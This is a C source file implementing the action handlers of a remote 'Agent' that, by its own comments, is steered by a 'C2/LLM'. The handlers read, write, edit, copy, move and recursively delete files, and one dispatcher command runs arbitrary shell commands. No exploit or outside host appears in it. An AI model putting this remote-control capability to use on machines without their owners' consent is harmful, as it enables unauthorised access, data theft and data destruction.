/* actions.c - local file system actions executed on the remote Agent.
 * Result strings follow the Python agent's exact wording so the C2/LLM
 * behavior stays consistent. Errors are reported as "Error: ..." strings.
 */
#include "agent.h"

/* ===================================================================== */
/* helpers                                                               */
/* ===================================================================== */

static char *slurp(const char *path, size_t *out_len) {
    FILE *f = fopen(path, "rb");
    if (!f) return NULL;
    if (fseek(f, 0, SEEK_END) != 0) { fclose(f); return NULL; }
    long sz = ftell(f);
    if (sz < 0) { fclose(f); return NULL; }
    if (fseek(f, 0, SEEK_SET) != 0) { fclose(f); return NULL; }
    char *buf = (char *)malloc((size_t)sz + 1);
    if (!buf) { fclose(f); return NULL; }
    size_t got = fread(buf, 1, (size_t)sz, f);
    fclose(f);
    buf[got] = 0;
    *out_len = got;
    return buf;
}

static int copy_file(const char *src, const char *dest) {
    FILE *fin = fopen(src, "rb");
    if (!fin) return -1;
    FILE *fout = fopen(dest, "wb");
    if (!fout) { fclose(fin); return -1; }
    char buf[65536];
    size_t n;
    while ((n = fread(buf, 1, sizeof buf, fin)) > 0) {
        if (fwrite(buf, 1, n, fout) != n) { fclose(fin); fclose(fout); return -1; }
    }
    fclose(fin);
    fclose(fout);
    return 0;
}

#ifdef _WIN32

static int rmtree(const char *path) {
    char pattern[PROTO_MAX_PATH];
    snprintf(pattern, sizeof pattern, "%s\\*", path);
    WIN32_FIND_DATAA fd;
    HANDLE h = FindFirstFileA(pattern, &fd);
    if (h != INVALID_HANDLE_VALUE) {
        do {
            if (!strcmp(fd.cFileName, ".") || !strcmp(fd.cFileName, "..")) continue;
            char full[PROTO_MAX_PATH];
            snprintf(full, sizeof full, "%s\\%s", path, fd.cFileName);
            if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) rmtree(full);
            else DeleteFileA(full);
        } while (FindNextFileA(h, &fd));
        FindClose(h);
    }
    RemoveDirectoryA(path);
    return 0;
}

static int copy_tree(const char *src, const char *dest) {
    mkdir_p(dest);
    char pattern[PROTO_MAX_PATH];
    snprintf(pattern, sizeof pattern, "%s\\*", src);
    WIN32_FIND_DATAA fd;
    HANDLE h = FindFirstFileA(pattern, &fd);
    if (h == INVALID_HANDLE_VALUE) return -1;
    do {
        if (!strcmp(fd.cFileName, ".") || !strcmp(fd.cFileName, "..")) continue;
        char sp[PROTO_MAX_PATH], dp[PROTO_MAX_PATH];
        snprintf(sp, sizeof sp, "%s\\%s", src, fd.cFileName);
        snprintf(dp, sizeof dp, "%s\\%s", dest, fd.cFileName);
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            if (copy_tree(sp, dp) != 0) { FindClose(h); return -1; }
        } else if (copy_file(sp, dp) != 0) { FindClose(h); return -1; }
    } while (FindNextFileA(h, &fd));
    FindClose(h);
    return 0;
}

static char *act_list_dir(const char *path) {
    char pattern[PROTO_MAX_PATH];
    snprintf(pattern, sizeof pattern, "%s\\*", path);
    WIN32_FIND_DATAA fd;
    HANDLE h = FindFirstFileA(pattern, &fd);
    if (h == INVALID_HANDLE_VALUE) {
        if (!path_exists(path)) return printf_str("Path does not exist: %s", path);
        if (!is_dir(path)) return printf_str("%s is a file", path);
        return xstrdup("Empty directory");
    }
    strbuf_t out;
    sb_init(&out);
    int count = 0;
    do {
        if (!strcmp(fd.cFileName, ".") || !strcmp(fd.cFileName, "..")) continue;
        int isd = (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) != 0;
        unsigned long long sz = isd ? 0ULL
            : (((unsigned long long)fd.nFileSizeHigh << 32) | (unsigned long long)fd.nFileSizeLow);
        sb_printf(&out, "%s %12" IRU_ULL " %s\n", isd ? "DIR" : "FILE", sz, fd.cFileName);
        count++;
    } while (FindNextFileA(h, &fd));
    FindClose(h);
    if (count == 0) { sb_free(&out); return xstrdup("Empty directory"); }
    return sb_take(&out);
}

#else /* POSIX */

static int rmtree(const char *path) {
    DIR *d = opendir(path);
    if (!d) return -1;
    struct dirent *de;
    while ((de = readdir(d)) != NULL) {
        if (!strcmp(de->d_name, ".") || !strcmp(de->d_name, "..")) continue;
        char full[PROTO_MAX_PATH];
        snprintf(full, sizeof full, "%s/%s", path, de->d_name);
        struct stat st;
        if (lstat(full, &st) == 0) {
            if (S_ISDIR(st.st_mode) && !S_ISLNK(st.st_mode)) rmtree(full);
            else remove(full);
        }
    }
    closedir(d);
    remove(path);
    return 0;
}

static int copy_tree(const char *src, const char *dest) {
    mkdir_p(dest);
    DIR *d = opendir(src);
    if (!d) return -1;
    struct dirent *de;
    while ((de = readdir(d)) != NULL) {
        if (!strcmp(de->d_name, ".") || !strcmp(de->d_name, "..")) continue;
        char sp[PROTO_MAX_PATH], dp[PROTO_MAX_PATH];
        snprintf(sp, sizeof sp, "%s/%s", src, de->d_name);
        snprintf(dp, sizeof dp, "%s/%s", dest, de->d_name);
        struct stat st;
        if (stat(sp, &st) == 0 && S_ISDIR(st.st_mode)) {
            if (copy_tree(sp, dp) != 0) { closedir(d); return -1; }
        } else if (copy_file(sp, dp) != 0) { closedir(d); return -1; }
    }
    closedir(d);
    return 0;
}

static char *act_list_dir(const char *path) {
    DIR *d = opendir(path);
    if (!d) {
        if (!path_exists(path)) return printf_str("Path does not exist: %s", path);
        if (!is_dir(path)) return printf_str("%s is a file", path);
        return xstrdup("Empty directory");
    }
    strbuf_t out;
    sb_init(&out);
    int count = 0;
    struct dirent *de;
    while ((de = readdir(d)) != NULL) {
        if (!strcmp(de->d_name, ".") || !strcmp(de->d_name, "..")) continue;
        char full[PROTO_MAX_PATH];
        snprintf(full, sizeof full, "%s/%s", path, de->d_name);
        struct stat st;
        int isd = 0;
        unsigned long long sz = 0;
        if (stat(full, &st) == 0) {
            isd = S_ISDIR(st.st_mode);
            if (!isd) sz = (unsigned long long)st.st_size;
        }
        sb_printf(&out, "%s %12" IRU_ULL " %s\n", isd ? "DIR" : "FILE", sz, de->d_name);
        count++;
    }
    closedir(d);
    if (count == 0) { sb_free(&out); return xstrdup("Empty directory"); }
    return sb_take(&out);
}

#endif

static void path_with_name(const char *path, const char *new_name, char *out, size_t outsz) {
    /* parent dir (kept verbatim, including trailing separator) + new_name.
       new_name is a plain name; the Python agent joins it onto the parent. */
    size_t len = strlen(path);
    size_t i = len;
    while (i > 0 && path[i - 1] != '/' && path[i - 1] != '\\') i--;
    if (i == 0) {
        snprintf(out, outsz, "%s", new_name);
    } else {
        size_t dirlen = i;
        if (dirlen >= outsz) dirlen = outsz - 1;
        memcpy(out, path, dirlen);
        out[dirlen] = 0;
        strncat(out, new_name, outsz - dirlen - 1);
    }
}

/* ===================================================================== */
/* actions                                                               */
/* ===================================================================== */

static char *act_get_cwd(void) {
    char buf[PROTO_MAX_PATH];
#ifdef _WIN32
    DWORD n = GetCurrentDirectoryA((DWORD)sizeof buf, buf);
    if (n == 0) return printf_str("Error getting cwd: %s", "failed");
#else
    if (!getcwd(buf, sizeof buf)) return printf_str("Error getting cwd: %s", strerror(errno));
#endif
    return xstrdup(buf);
}

static char *act_make_dir(char **p, int n) {
    if (n < 1) return xstrdup("Error: missing make_dir path");
    const char *path = p[0];
    if (path_exists(path)) return printf_str("Directory already exists: %s", path);
    mkdir_p(path);
    if (!path_exists(path)) return printf_str("Error creating directory: %s", "failed");
    return printf_str("Successfully created directory: %s", path);
}

static char *act_create_file(char **p, int n) {
    if (n < 1) return xstrdup("Error: missing create_file path");
    const char *path = p[0];
    if (path_exists(path)) return printf_str("File already exists: %s", path);
    make_parent_dirs(path);
    FILE *f = fopen(path, "wb");
    if (!f) return printf_str("Error creating file: %s", strerror(errno));
    fclose(f);
    return printf_str("Successfully created file: %s", path);
}

static char *act_delete(char **p, int n) {
    if (n < 1) return xstrdup("Error: missing delete path");
    const char *path = p[0];
    if (!path_exists(path)) return printf_str("Path does not exist: %s", path);
    if (is_dir(path)) {
        if (rmtree(path) != 0) return printf_str("Error deleting: %s", strerror(errno));
    } else {
        if (remove(path) != 0) return printf_str("Error deleting: %s", strerror(errno));
    }
    return printf_str("Successfully deleted: %s", path);
}

static char *act_rename(char **p, int n) {
    if (n < 2) return xstrdup("Error: missing rename params");
    const char *path = p[0];
    const char *new_name = p[1];
    if (!path_exists(path)) return printf_str("Path does not exist: %s", path);
    char newpath[PROTO_MAX_PATH];
    path_with_name(path, new_name, newpath, sizeof newpath);
    if (path_exists(newpath)) return printf_str("Target name already exists: %s", new_name);
    if (rename(path, newpath) != 0) return printf_str("Error renaming: %s", strerror(errno));
    return printf_str("Successfully renamed: %s -> %s", path, new_name);
}

static char *act_read_file(char **p, int n) {
    if (n < 1) return xstrdup("Error: missing read_file path");
    const char *path = p[0];
    const char *sl = (n > 1) ? p[1] : "0";
    const char *el = (n > 2) ? p[2] : "0";
    if (!path_exists(path)) return printf_str("File does not exist: %s", path);
    if (is_dir(path)) return printf_str("%s is a directory", path);

    size_t blen = 0;
    char *raw = slurp(path, &blen);
    if (!raw) return printf_str("Error reading file: %s", strerror(errno));

    /* whole-file mode */
    int whole = (sl == NULL || sl[0] == 0 || strcmp(sl, "0") == 0);
    if (whole) {
        size_t take = blen < READ_FILE_LIMIT ? blen : READ_FILE_LIMIT;
        char *res = (char *)malloc(take + 1);
        if (!res) { free(raw); return xstrdup("Error reading file: out of memory"); }
        memcpy(res, raw, take);
        res[take] = 0;
        free(raw);
        return res;
    }

    /* line mode: split into lines keeping trailing '\n' */
    typedef struct { const char *s; size_t n; } line_t;
    line_t *lines = (line_t *)malloc(sizeof(line_t) * 128);
    int cap = 128, nlines = 0;
    if (!lines) { free(raw); return xstrdup("Error reading file: out of memory"); }
    size_t i = 0;
    while (i < blen) {
        size_t s = i;
        while (i < blen && raw[i] != '\n') i++;
        size_t e = (i < blen) ? i + 1 : i; /* include '\n' */
        if (nlines == cap) {
            cap *= 2;
            line_t *nl = (line_t *)realloc(lines, (size_t)cap * sizeof(line_t));
            if (!nl) { free(lines); free(raw); return xstrdup("Error reading file: out of memory"); }
            lines = nl;
        }
        lines[nlines].s = raw + s;
        lines[nlines].n = e - s;
        nlines++;
        i = e;
    }

    int start = atoi(sl);
    if (start < 1) start = 1;
    int s = start - 1;
    int end = (el && el[0] && strcmp(el, "0")) ? atoi(el) : nlines;
    if (s >= nlines) {
        char *err = printf_str("Start line %s exceeds file line count (%d)", sl, nlines);
        free(lines);
        free(raw);
        return err;
    }
    if (end > nlines) end = nlines;
    if (end < s) end = s;

    strbuf_t out;
    sb_init(&out);
    for (int k = s; k < end; k++) sb_append(&out, lines[k].s, lines[k].n);
    char *res = sb_take(&out);
    free(lines);
    free(raw);
    return res;
}

static char *act_write_file(char **p, int n) {
    if (n < 2) return xstrdup("Error: missing write_file params");
    const char *path = p[0];
    const char *content = p[1];
    make_parent_dirs(path);
    FILE *f = fopen(path, "wb");
    if (!f) return printf_str("Error writing file: %s", strerror(errno));
    size_t clen = strlen(content);
    if (clen) fwrite(content, 1, clen, f);
    fclose(f);
    return printf_str("Successfully wrote to: %s", path);
}

static char *act_edit_file(char **p, int n) {
    if (n < 4) return xstrdup("Error: missing edit_file params");
    const char *path = p[0];
    const char *op = p[1];
    const char *sl = p[2];
    const char *el = p[3];
    const char *content = (n > 4) ? p[4] : "";

    if (!path_exists(path)) return printf_str("File does not exist: %s", path);
    if (is_dir(path)) return printf_str("%s is a directory", path);

    size_t blen = 0;
    char *raw = slurp(path, &blen);
    if (!raw) return printf_str("Error editing file: %s", strerror(errno));

    /* parse into line list (each line includes trailing '\n') */
    typedef struct { char *s; } ll_t;
    ll_t *ll = (ll_t *)malloc(sizeof(ll_t) * 128);
    int cap = 128, nlines = 0;
    if (!ll) { free(raw); return xstrdup("Error editing file: out of memory"); }
    size_t i = 0;
    while (i < blen) {
        size_t s = i;
        while (i < blen && raw[i] != '\n') i++;
        size_t e = (i < blen) ? i + 1 : i;
        if (nlines == cap) {
            cap *= 2;
            ll_t *nl = (ll_t *)realloc(ll, (size_t)cap * sizeof(ll_t));
            if (!nl) { free(ll); free(raw); return xstrdup("Error editing file: out of memory"); }
            ll = nl;
        }
        ll[nlines].s = (char *)malloc(e - s + 1);
        if (!ll[nlines].s) { free(ll); free(raw); return xstrdup("Error editing file: out of memory"); }
        memcpy(ll[nlines].s, raw + s, e - s);
        ll[nlines].s[e - s] = 0;
        nlines++;
        i = e;
    }
    free(raw);

    int start = atoi(sl);
    if (start < 1) start = 1;
    int s = start - 1;
    int end = (el && el[0] && strcmp(el, "0")) ? atoi(el) : 0;
    if (end > nlines) end = nlines;

    int ok = 1;
    char *err = NULL;

    if (strcmp(op, "add") == 0) {
        if (s > nlines) s = nlines;
        /* insert content + '\n' at s */
        ll_t *nl = (ll_t *)realloc(ll, (size_t)(cap + 1) * sizeof(ll_t));
        if (!nl) { ok = 0; err = xstrdup("Error editing file: out of memory"); }
        else {
            ll = nl;
            memmove(&ll[s + 1], &ll[s], (size_t)(nlines - s) * sizeof(ll_t));
            size_t clen = strlen(content);
            ll[s].s = (char *)malloc(clen + 2);
            if (!ll[s].s) { ok = 0; err = xstrdup("Error editing file: out of memory"); }
            else {
                memcpy(ll[s].s, content, clen);
                ll[s].s[clen] = '\n';
                ll[s].s[clen + 1] = 0;
                nlines++;
            }
        }
    } else if (strcmp(op, "del") == 0) {
        if (s >= nlines) {
            ok = 0;
            err = printf_str("Start line %s exceeds file line count (%d)", sl, nlines);
        } else {
            if (end < s) end = s;
            if (end > nlines) end = nlines;
            for (int k = s; k < end; k++) free(ll[k].s);
            memmove(&ll[s], &ll[end], (size_t)(nlines - end) * sizeof(ll_t));
            nlines -= (end - s);
        }
    } else if (strcmp(op, "modify") == 0) {
        if (s >= nlines) {
            ok = 0;
            err = printf_str("Start line %s exceeds file line count (%d)", sl, nlines);
        } else {
            if (end < s) end = s;
            if (end > nlines) end = nlines;
            for (int k = s; k < end; k++) free(ll[k].s);
            memmove(&ll[s], &ll[end], (size_t)(nlines - end) * sizeof(ll_t));
            nlines -= (end - s);
            /* insert content + '\n' at s */
            ll_t *nl = (ll_t *)realloc(ll, (size_t)(cap + 1) * sizeof(ll_t));
            if (!nl) { ok = 0; err = xstrdup("Error editing file: out of memory"); }
            else {
                ll = nl;
                memmove(&ll[s + 1], &ll[s], (size_t)(nlines - s) * sizeof(ll_t));
                size_t clen = strlen(content);
                ll[s].s = (char *)malloc(clen + 2);
                if (!ll[s].s) { ok = 0; err = xstrdup("Error editing file: out of memory"); }
                else {
                    memcpy(ll[s].s, content, clen);
                    ll[s].s[clen] = '\n';
                    ll[s].s[clen + 1] = 0;
                    nlines++;
                }
            }
        }
    } else {
        ok = 0;
        err = printf_str("Unknown operation: %s. Use 'add', 'del', or 'modify'", op);
    }

    if (!ok) {
        for (int k = 0; k < nlines; k++) free(ll[k].s);
        free(ll);
        return err;
    }

    FILE *f = fopen(path, "wb");
    if (!f) {
        char *e2 = printf_str("Error editing file: %s", strerror(errno));
        for (int k = 0; k < nlines; k++) free(ll[k].s);
        free(ll);
        return e2;
    }
    for (int k = 0; k < nlines; k++) {
        size_t clen = strlen(ll[k].s);
        if (clen) fwrite(ll[k].s, 1, clen, f);
    }
    fclose(f);
    for (int k = 0; k < nlines; k++) free(ll[k].s);
    free(ll);
    return printf_str("Successfully performed %s on file: %s", op, path);
}

static char *act_copy(char **p, int n) {
    if (n < 2) return xstrdup("Error: missing copy params");
    const char *src = p[0];
    const char *dest = p[1];
    if (!path_exists(src)) return printf_str("Source not found: %s", src);
    if (is_dir(src)) {
        if (copy_tree(src, dest) != 0) return printf_str("Error copying: %s", strerror(errno));
    } else {
        make_parent_dirs(dest);
        if (copy_file(src, dest) != 0) return printf_str("Error copying: %s", strerror(errno));
    }
    return printf_str("Successfully copied: %s -> %s", src, dest);
}

static char *act_move(char **p, int n) {
    if (n < 2) return xstrdup("Error: missing move params");
    const char *src = p[0];
    const char *dest = p[1];
    if (!path_exists(src)) return printf_str("Source not found: %s", src);
    make_parent_dirs(dest);
    if (rename(src, dest) != 0) return printf_str("Error moving: %s", strerror(errno));
    return printf_str("Successfully moved: %s -> %s", src, dest);
}

/* ===================================================================== */
/* dispatcher                                                            */
/* ===================================================================== */

char *run_action(uint8_t cmd, char **p, int n, int cmd_timeout) {
    switch (cmd) {
        case CMD_GET_CWD:       return act_get_cwd();
        case CMD_LIST_DIR:      if (n < 1) return xstrdup("Error: missing list_dir path");
                                return act_list_dir(p[0]);
        case CMD_MAKE_DIR:      return act_make_dir(p, n);
        case CMD_CREATE_FILE:   return act_create_file(p, n);
        case CMD_DELETE_DIR:    return act_delete(p, n);
        case CMD_DELETE_FILE:   return act_delete(p, n);
        case CMD_RENAME_DIR:    return act_rename(p, n);
        case CMD_RENAME_FILE:   return act_rename(p, n);
        case CMD_READ_FILE:     return act_read_file(p, n);
        case CMD_WRITE_FILE:    return act_write_file(p, n);
        case CMD_EDIT_FILE:     return act_edit_file(p, n);
        case CMD_COPY:          return act_copy(p, n);
        case CMD_MOVE:          return act_move(p, n);
        case CMD_EXEC_CMD:      if (n < 1) return xstrdup("Error: missing exec_cmd command");
                                return run_cmd(p[0], cmd_timeout);
        default:                return printf_str("Error: Unknown action: %d", cmd);
    }
}
